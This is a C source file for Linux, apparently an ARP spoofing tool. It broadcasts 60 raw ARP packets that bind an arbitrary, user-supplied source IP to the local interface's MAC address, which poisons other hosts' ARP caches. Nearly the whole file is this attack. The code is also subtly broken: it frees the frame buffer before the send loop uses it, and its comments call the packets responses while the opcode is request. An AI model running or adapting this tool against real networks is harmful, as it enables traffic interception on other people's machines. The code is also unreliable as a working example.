#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <unistd.h>

#include <stdlib.h>

#define ETH_HDRLEN 14
#define IP4_HDRLEN 20
#define ARP_HDRLEN 28
#define FRAME_LEN 6 + 6 + 2 + ARP_HDRLEN
#define ARP_RES_AMOUNT 60
#define TIME_BETWEEN_ARP 1

typedef struct{
    uint16_t htype;
    uint16_t ptype;
    uint8_t hlen;
    uint8_t plen;
    uint16_t opcode;
    uint8_t sender_mac[6];
    uint8_t sender_ip[4];
    uint8_t target_mac[6];
    uint8_t target_ip[4];
} arp_hdr;

char* interface;

unsigned char* get_mac_addr() // Get the mac address from the given interface, if the interface not found, search all interfaces
{
    static unsigned char mac_addr[6];
    struct ifreq ifr, *it;
    struct ifconf ifc;
    

    char buf[1024];
    int success = 0;
    int sock;

    // Create a socket to look up for interfaces
    if((sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP)) == -1)
    {
        printf("Failed to open socket\n");
    }

    printf("Look up for interface \"%s\"...\n", interface);

    memset(&ifr, 0, sizeof(ifr));
    snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", interface);
    
    // Look up for the interface provided
    if(ioctl(sock, SIOCGIFHWADDR, &ifr) == 0)
    {
        success = 1;
    }else
        printf("Could not find interface specified\nSearching all interfaces...\n");

    if(!success)
    {
        ifc.ifc_len = sizeof(buf);
        ifc.ifc_buf = buf;

        // Get all interfaces
        if(ioctl(sock, SIOCGIFCONF, &ifc) == -1)
        {
            printf("Failed to laod interfaces\n");
        }

        // Set iterator
        it = ifc.ifc_req;
        
        // Set end to the last structure
        const struct ifreq* const end = it + (ifc.ifc_len / sizeof(struct ifreq));

        // Iterate interfaces and get the mac of the first one you can
        while(it != end)
        {
            strcpy(ifr.ifr_name, it->ifr_name);
            if(ioctl(sock, SIOCGIFFLAGS, &ifr) == 0)
            {
                if(!(ifr.ifr_flags & IFF_LOOPBACK)) // Check if the current interface is not the LOOPBACK
                {
                    if(ioctl(sock, SIOCGIFHWADDR, &ifr) == 0)
                    {
                        interface = ifr.ifr_name;
                        success = 1;
                        break;
                    }
                }
            }
            it++;
        }
    }
    
    close(sock);

    // Save the mac address
    if(success)
        memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, 6);
    else
    {
        printf("Unable to find mac address");
        return NULL;
    }

    return mac_addr;
}

int create_and_send_arp(const unsigned char* src_mac, char* source_ip, char* destination_ip) // Create arp header, set ethernet frame and send it
{
    int i, status, frame_len, sock, bytes;
    char *dst_ip, *src_ip;
    arp_hdr arphdr;
    uint8_t *dst_mac, *ether_frame;
    struct addrinfo hints, *res;
    struct sockaddr_in *ipv4;
    struct sockaddr_ll device;

    memset(&device, 0, sizeof(device));
    
    // Get interface's index
    if((device.sll_ifindex = if_nametoindex(interface)) == 0)
    {
        printf("if_nametoindex() failed\n");
        return -1;
    }
    printf("The index of interface \"%s\" is: %d\n", interface, device.sll_ifindex);

    dst_mac = (uint8_t *) malloc (6 * sizeof (uint8_t));
    memset(dst_mac, 0xff, 6);
    
    // Copying the ip addresses provided
    dst_ip = (char *) malloc (INET_ADDRSTRLEN * sizeof (char));
    src_ip = (char *) malloc (INET_ADDRSTRLEN * sizeof (char));
    strncpy(src_ip, source_ip, INET_ADDRSTRLEN);
    strncpy(dst_ip, destination_ip, INET_ADDRSTRLEN);

    // Initialize hints
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = hints.ai_flags | AI_CANONNAME;
    
    // Convert to binary form
    if((status = inet_pton(AF_INET, src_ip, &arphdr.sender_ip)) == -1)
    {
        printf("inet_pton() failed for source IP address\n");
        free(dst_ip);
        free(src_ip);
        free(dst_mac);
        return -1;
    }

    if((status = getaddrinfo(dst_ip, NULL, &hints, &res)) != 0)
    {
        printf("getaddrinfo() failed for target IP address\n");
        free(dst_ip);
        free(src_ip);
        free(dst_mac);
        return -1;
    }
    ipv4 = (struct sockaddr_in*) res->ai_addr;
    memcpy(&arphdr.target_ip, &ipv4->sin_addr, 4 * sizeof(uint8_t));
    freeaddrinfo(res);

    // initialize device
    device.sll_family = AF_PACKET;
    memcpy(device.sll_addr, src_mac, 6 * sizeof(uint8_t));
    device.sll_halen = 6;

    // initialize arp header
    arphdr.htype = htons(1);
    arphdr.ptype = htons(ETH_P_IP);
    arphdr.hlen = 6;
    arphdr.plen = 4;
    arphdr.opcode = htons(ARPOP_REQUEST);
    memcpy(&arphdr.sender_mac, src_mac, 6 * sizeof(uint8_t));
    memset(&arphdr.target_mac, 0, 6 * sizeof(uint8_t));

    frame_len = FRAME_LEN;

    ether_frame = (uint8_t *) malloc (IP_MAXPACKET * sizeof (uint8_t));
    memcpy(ether_frame, dst_mac, 6 * sizeof(uint8_t));
    memcpy(ether_frame + 6, src_mac, 6 * sizeof(uint8_t));

    ether_frame[12] = ETH_P_ARP / 256;
    ether_frame[13] = ETH_P_ARP % 256;

    memcpy(ether_frame + ETH_HDRLEN, &arphdr, ARP_HDRLEN * sizeof(uint8_t));

    // Create a socket to send packets without any transport protocol
    if((sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
    {
        printf("Failed to create socket\n");
        free(dst_ip);
        free(src_ip);
        free(dst_mac);
        free(ether_frame);
        return -1;
    }

    free(dst_ip);
    free(src_ip);
    free(dst_mac);
    free(ether_frame);

    // Send ARP responses
    for(i = 1; i <= ARP_RES_AMOUNT; i++)
    {
        if((bytes = sendto(sock, ether_frame, frame_len, 0, (struct sockaddr*) &device, sizeof(device))) <= 0)
        {
            printf("ARP %d/%d - sendto() failed\n", i, ARP_RES_AMOUNT);
            return -1;
        }
        printf("ARP %d/%d sent successfully\n", i, ARP_RES_AMOUNT);
        sleep(TIME_BETWEEN_ARP);
    }

    printf("Done sending Arps responses\n");

    close(sock);

    return 0;
}

int main(int argc, char **argv)
{
    // Check if the number of arguments provided is ok
    if(argc != 4)
    {
        printf("Wrong call! Do $ sudo ./[File] [Destination IP] [Source IP] [Interface]\n");
        return -1;
    }

    int i;

    // Get the source mac address
    interface = argv[3];
    const unsigned char const *src_mac = get_mac_addr();
    
    if(src_mac == NULL)
        return -1;

    // Print the source mac address
    printf("The mac of interface \"%s\" is: ", interface);
    for(i = 0; i < 5; i++)
        printf("%02x:", src_mac[i]);
    printf("%02x\n", src_mac[5]);

    return create_and_send_arp(src_mac, argv[2], argv[1]);
}
